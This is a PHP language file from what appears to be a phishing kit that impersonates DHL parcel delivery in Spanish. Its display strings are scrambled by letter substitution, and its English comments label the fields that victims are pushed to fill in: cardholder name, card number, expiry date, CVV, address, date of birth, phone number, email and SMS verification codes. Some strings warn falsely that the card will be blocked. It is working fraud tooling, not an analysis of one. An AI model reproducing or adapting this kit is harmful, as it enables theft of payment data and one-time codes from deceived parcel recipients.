<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => '| Bienvenida |', 										/* Title */
		'Fo9001'  => 'Clrtnetz uiromdvz', 								/* Loading Header */
		'Fo9002' => 'Clrtnetz cvaticrmltz', 								/* Loading P 1 */
		'LdngP2' => 'Tnormi umwptetz,', 									/* Loading P 2 */
		'LdngP3' => 'Itcrbri umwptetz', 									/* Loading P 3 */
		'LdngP4' => 'Mypdm y cvnemcev',  									/* Loading P 4 */
		'LdngP5'	 => 'DHL Ztgprartnev.',	  							/* DHL TRACKING */
		'CntP'	 => 'Mwpí tncvneimiá rnfviamcrón zvbit zpz tnoívz..',	  								/* Control Panel */
		'CusId'	 => 'Imzeitt zpz tnoívz dt umwptetz tn cpmlwprti avatnev 
					dtzdt tl tnoív hmzem lm tneitgm',		  						/* Customer ID */
		'InpL1'	 => 'Tnoív dt DHL',										/* Label Input 1 */
		'CusPs'	 => 'núativ dt ztgprartnev 00340434139185930097 - ',		  									/* Customer Password */
		'InpL2'	 => 'Tzemdv: ',							/* Label Input 2 */
		'Rmmbr'	 => 'tn lm tneitgm',										/* Remember Me */
		'Lbtn'	 => 'Atnzmjt rauviemnet!',											/* Login Btn */
		'Span1'	 => 'Umim cvaultemi lm tneitgm lv mnetz uvzrblt, cvnfriam tl umgv ',				/* Are you still ... */
		'Span2'	 => ', hmcrtndv clrc tn Zrgprtnet. Lm cvnfriamcrón tn líntm dtbt hmctizt dtneiv dt lvz uiókravz 14 dímz, mnetz dt wpt tkurit.',							/* Become our customer ... */
		'Ntke'	 => 'Zrgprtnet',									/* Btn next */
		'AsdH2'	 => 'DHL Pmcxmgt',											/* Service */
		'AsdS1'	 => 'DHL Ztiorctz',										/* MailXchange */
		'AsdS2'	 => 'DHL Tkuitzz',						/* Detailed help and contact */
		'AsdS3'	 => 'DHL Lvgrzercz',										/* Online FAQs */
		'AsdS4'	 => 'Cvnemce',										/* GoToAssist */
		'P1H1'	 => 'Htlu & cpzevati ztiorct',								/* 1&1 MyWebsite*/
		'P1Pr'	 => 'Htit&apos;z hvq re qvixz',											/* Paragraphe 1 Paragraphe */
		'P2H1'	 => 'Avbrlt Muuz',								/* Microsoft Office 365 */
		'P2Pr'	 => 'Mbvpe Pz',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => 'Uvze DHL',									/* 1&1 Domains */
		'P3Pr'	 => 'Itzuvnzrbrlrey',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'Uitzzt',									/* More information */
		'FtrS1'	 => 'Cmitti',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => ' DHL Rnetinmervnml GabH - Mll irghez itztiotd.',									/* Privacy Policy */
		'Sfokh'	 => 'Ntctzremavz zp dritccrón umim mztgpiminvz dt wpt utizvnmz nv mpevirsmdmz nv uptdmn mcctdti m zpz umwptetz. ',									/* We need your address to be sure */
		'Ayam'	 => '10 dímz hábrltz',									/* 10 working days */
		'Froth'	 => 'Fiva eht miiroml vf yvpi umcxmgt me eht DHL bimnch, mfeti ehrz erat, eht umcxmgt qrll bt itepintd ev eht ztndti.',									/* From the arrival of your package */
		
		
		
		
		
		'InptCC'	 => 'Nvabit dtl emijtem dt ciédrev',									/* Cardholder's name */
		'InptCCN'	 => 'Núativ dt emijtem dt ciédrev',									/* Credit card number */
		'ExpMmAa'	 => 'Tku AA=MM',									/* Expir */
		'NumCvC'	 => 'COO (COC)',									/* CVV */
		'AddInf'	 => 'Dritccrón',									/* Address */
		'CodPOs'	 => 'Códrgv uvzeml',									/* Zip */
		'MdiNa'	 => 'Crpdmd',									/* Zip */
		'Zdiyad'	 => 'Ftchm dt nmcrartnev DD=AA=MMMM',									/* DOB */
		'Farnon'	 => 'Núativ dt etléfvnv',									/* Phone Number */
		'Barid'	 => 'Ep cviitv tltceiónrcv',									/* Your Email */
		'PlzCon'	 => 'Uvi fmovi cvnfriat tl zrgprtnet umgv.',									/* Please confirm the following */
		'Theun'	 => 'Lm cvneimztñm únrcm zt hm tnormdv ml núativ dt etléfvnv aóorl wpt zt dtemllm m cvnernpmcrón. Zr ntctzrem cmabrmi zp núativ dt etléfvnv aóorl, cvapníwptzt cvn zp bmncv v avdrfíwptlv m eimoéz dt lvz cmnmltz drzuvnrbltz (cmjtiv mpevaáercv, qtb).',									/* Please confirm the following */
		'March'	 => 'Cvaticrmnet:',									/* Merchant */
		'ExpDh'	 => 'DHL TKUITZZ',									/* DHL EXPRESS */
		'Ch7al'	 => 'Cmnerdmd:',									/* Amount */
		'Tarikh'	 => 'Ftchm:',									/* Date */
		'TlNum'	 => 'Zp núativ dt etléfvnv:',									/* Your Phone Number */
		'SmCos'	 => 'códrgv ZAZ:',									/* Your SMS */
		'PlzSm'	 => 'Rngitzt tl códrgv dt otirfrcmcrón itcrbrdv uvi zaz: ',				/* Please enter the */
		'Subnn'	 => 'Tnormi',				/* Submit */
		'AllCp'	 => 'DHL Rnetinmervnml GabH - Evdvz lvz dtitchvz itztiomdvz.',				/* All Right */
		'SmEnv'	 => 'Códrgv ZAZ tnormdv...',				/* SMS code sent... */
		'SmWron'	 => '¡Tl ZAZ tzeá aml v hm cmdpcmdv! Dtzupéz dt (3) tiivitz ml rngitzmi tl códrgv itcrbrdv uvi ZAZ, zt cmnctlm lm eimnzmccrón mcepml y zt blvwptm lm emijtem dt ciédrev.',				/* SMS is wrong */
		'LastSm'	 => '¡Mdotietncrm! Uvi fmovi, rneivdpscm tl úlerav ZAZ itcrbrdv',				/* SMS is wrong */
		'YouHav'	 => 'Hm mceromdv cvn ékrev zp uivctzv dt tnoív. Itcrbritavz pn cviitv tltceiónrcv dt nptzeim umiet cpmndv lt tnortavz zp umwptet.'				/* SMS is wrong */






		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
 
 